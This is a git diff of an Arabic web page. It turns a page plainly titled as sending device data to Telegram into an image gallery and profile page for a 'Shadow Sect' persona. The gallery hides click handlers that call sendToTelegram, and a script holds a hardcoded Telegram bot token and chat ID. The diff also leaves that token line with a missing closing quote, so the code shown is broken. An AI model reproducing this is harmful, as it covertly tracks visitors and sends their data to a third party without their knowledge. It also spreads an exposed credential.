@@ -1,18 +1,227 @@
-<!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html lang="ar">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>إرسال بيانات جهاز إلى تلجرام</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0">
+  <title>طائفة الظلال - العنقاء_666</title>
+  <style>
+    body {
+      margin: 0;
+      background-color: pink;
+      font-family: Arial, sans-serif;
+      direction: rtl;
+      text-align: center;
+      overflow-x: hidden;
+      position: relative;
+    }
+
+    .top-description {
+      background: linear-gradient(90deg, #4b0082, black, #4b0082);
+      color: white;
+      padding: 15px;
+      font-weight: bold;
+      font-size: 16px;
+      animation: fadeInOut 5s ease-in-out infinite;
+    }
+
+    @keyframes fadeInOut {
+      0%, 100% { opacity: 0.1; }
+      50% { opacity: 1; }
+    }
+
+    header {
+      background-image: url('5alfia.png');
+      background-size: cover;
+      background-position: center;
+      height: 250px;
+      position: relative;
+    }
+
+    .profile-pic {
+      width: 110px;
+      height: 110px;
+      border-radius: 50%;
+      border: 5px solid white;
+      background-image: url('profile.png');
+      background-size: cover;
+      background-position: center;
+      position: absolute;
+      bottom: -55px;
+      right: 20px;
+      animation: pulse 2s infinite;
+      box-shadow: 0 0 10px purple;
+      cursor: pointer;
+    }
+
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(128, 0, 128, 0.7); }
+      70% { box-shadow: 0 0 0 15px rgba(128, 0, 128, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(128, 0, 128, 0); }
+    }
+
+    .posts-container {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 10px;
+      padding: 80px 10px 30px;
+    }
+
+    .post-img {
+      width: 100%;
+      height: 120px;
+      object-fit: cover;
+      border-radius: 10px;
+      cursor: pointer;
+      transition: transform 0.3s, box-shadow 0.3s;
+    }
+
+    .post-img:hover {
+      transform: scale(1.05);
+      box-shadow: 0 0 15px #4b0082;
+    }
+
+    .lightbox {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.9);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 999;
+      flex-direction: column;
+    }
+
+    .lightbox img {
+      max-width: 90%;
+      max-height: 80%;
+      border-radius: 10px;
+      margin-bottom: 20px;
+    }
+
+    .lightbox:target {
+      display: flex;
+    }
+
+    .close-btn {
+      position: absolute;
+      top: 20px;
+      left: 20px;
+      font-size: 30px;
+      color: white;
+      text-decoration: none;
+    }
+
+    .download-btn {
+      background-color: purple;
+      color: white;
+      padding: 10px 20px;
+      border-radius: 10px;
+      text-decoration: none;
+      font-size: 16px;
+    }
+
+    .video-fab, .blog-fab {
+      position: fixed;
+      bottom: 20px;
+      width: 60px;
+      height: 60px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 24px;
+      animation: pulse 2s infinite;
+      cursor: pointer;
+      z-index: 1000;
+    }
+
+    .video-fab {
+      right: 20px;
+      background-color: black;
+      color: pink;
+      box-shadow: 0 0 15px pink;
+    }
+
+    .blog-fab {
+      left: 20px;
+      background-color: yellow;
+      color: black;
+      box-shadow: 0 0 15px yellow;
+    }
+  </style>
 </head>
-<body>
+<body onclick="handleClick(event)">
 
-    <h1>بيانات جهازك يتم إرسالها الآن...</h1>
+  <div class="top-description">رڪوب جلجامشة ♞ تجاوزت جلجامشة الوردية 🌸 خطوط الحمراء 🔴
 
+وبذالڪ صار دعسها ☢️ عنوانها الأول ولأخير 🧐
 
-<script>
-    
-      const preview = document.getElementById('imagePreview');
+طائفة الظلال تتجاوز العتمة لتحڪم في لأخيࢪ 👑
+
+نحن الذي نفعل قبل ان نتڪلم 👹
+
+لطالما كان ظلام حروفًا لا يمكن فهمها إلا من قرئها وشادو من سا يكتب الكلمات 🖌📖
+  </div>
+
+  <header>
+    <div class="profile-pic" onclick="sendToTelegram('👤 ضغط على صورة البروفايل')"></div>
+  </header>
+  
+  <div class="posts-container">
+    <a href="#img21"><img src="" class="post-img"></a>
+    <a href="#img20"><img src="بدون اسم106_20250320185748.png" class="post-img"></a>
+    <a href="#img19"><img src="بدون اسم107_20250320195804.png" class="post-img"></a>
+  </div>
+  
+  <div class="posts-container">
+    <a href="#img18"><img src="بدون اسم109_20250322183633.png" class="post-img"></a>
+    <a href="#img17"><img src="بدون اسم112_20250408090340.png" class="post-img"></a>
+    <a href="#img16"><img src="بدون اسم84_20250318141951.png" class="post-img"></a>
+  </div>
+  
+  <div class="posts-container">
+    <a href="#img15"><img src="بدون اسم88_20250318154918.png" class="post-img"></a>
+    <a href="#img14"><img src="بدون اسم92_20250318224139.png" class="post-img"></a>
+    <a href="#img13"><img src="20250807_101709.jpg" class="post-img"></a>
+  </div>
+
+  <div class="posts-container">
+    <a href="#img12"><img src="photo12.png" class="post-img"></a>
+    <a href="#img11"><img src="photo11.png" class="post-img"></a>
+    <a href="#img10"><img src="photo10.png" class="post-img"></a>
+  </div>
+
+  <div class="posts-container">
+    <a href="#img9"><img src="photo9.png" class="post-img"></a>
+    <a href="#img8"><img src="photo8.png" class="post-img"></a>
+    <a href="#img7"><img src="photo7.png" class="post-img"></a>
+  </div>
+
+  <div class="posts-container">
+    <a href="#img6"><img src="photo6.png" class="post-img"></a>
+    <a href="#img5"><img src="photo5.png" class="post-img"></a>
+    <a href="#img4"><img src="photo4.png" class="post-img"></a>
+  </div>
+
+  <div class="posts-container">
+    <a href="#img3"><img src="photo3.png" class="post-img"></a>
+    <a href="#img2"><img src="photo2.png" class="post-img"></a>
+    <a href="#img1"><img src="photo1.png" class="post-img"></a>
+  </div>
+
+  <!-- ✅ أزرار التنقل بعد التعديل -->
+  <div class="video-fab" onclick="goTo('video')" title="صفحة الفيديوهات">🎥</div>
+  <div class="blog-fab" onclick="goTo('blog')" title="صفحة المدونات">📖</div>
+
+  <!-- نافذة تكبير الصورة -->
+  <div id="imagePreview" style="display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.95); z-index:9999; justify-content:center; align-items:center; flex-direction:column;">
+    <img id="previewImg" src="" alt="Preview" style="max-width:90vw; max-height:80vh; border-radius:20px; box-shadow:0 0 20px violet;">
+    <a id="downloadBtn" href="#" download style="margin-top:20px; padding:10px 20px; background:violet; color:white; border:none; border-radius:10px; font-size:16px; text-decoration:none; animation:pulse 1.5s infinite;">تحميل الصورة</a>
+  </div>
+
+  <!-- سكربت التكبير -->
+  <script>
+    const preview = document.getElementById('imagePreview');
     const img = document.getElementById('previewImg');
     const downloadBtn = document.getElementById('downloadBtn');
 
@@ -66,7 +275,7 @@
 
 
 <script>
-const token = "7782080900:AAGvcMWaE_IAbb_0_0-HwcyCvQUUUVxBYmc";
+const token = "7782080900:AAGvcMWaE_IAbb_0_0-HwcyCvQUUUVxBYmc;
 const chat_id = "5932979028";
 
 // دالة إرسال رسالة نصية
